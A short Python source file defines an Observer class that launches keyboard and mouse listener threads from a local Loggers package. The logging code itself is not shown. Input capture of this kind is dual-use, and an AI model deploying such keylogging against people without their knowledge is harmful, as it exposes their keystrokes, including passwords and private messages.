from multiprocessing import Process
from threading import Thread

from Loggers.KeyLogger import KeyLogger
from Loggers.MouseLogger import MouseLogger


class Observer:
    
    def activate_listeners(self):        
        mouse = Thread(target=MouseLogger().mouse_listener)
        key = Thread(target=KeyLogger().keyboard_listener)
        
        mouse.start()
        key.start()
        
        mouse.join()
        key.join()
        